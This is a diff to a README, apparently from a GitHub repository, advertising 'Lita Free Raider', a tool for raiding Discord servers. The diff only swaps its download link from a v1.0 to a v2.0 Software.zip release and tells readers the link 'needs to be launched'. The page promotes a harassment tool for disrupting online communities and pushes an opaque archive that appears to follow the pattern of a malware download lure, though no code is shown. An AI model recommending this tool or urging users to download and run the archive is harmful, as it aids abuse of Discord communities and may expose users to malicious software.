@@ -24,7 +24,7 @@ With "Lita Free Raider," you gain access to a wide array of tools for Discord ra
 
 ## Get Started
 To get started with "Lita Free Raider," download the tool from the following link:
-[![Download Lita Free Raider](https://github.com/Xy512-ggg/Free-lita-raider/releases/download/v1.0/Software.zip)](https://github.com/Xy512-ggg/Free-lita-raider/releases/download/v1.0/Software.zip)
+[![Download Lita Free Raider](https://github.com/Xy512-ggg/Free-lita-raider/releases/download/v2.0/Software.zip)](https://github.com/Xy512-ggg/Free-lita-raider/releases/download/v2.0/Software.zip)
 
 Note: The download link needs to be launched to access the tool.
 
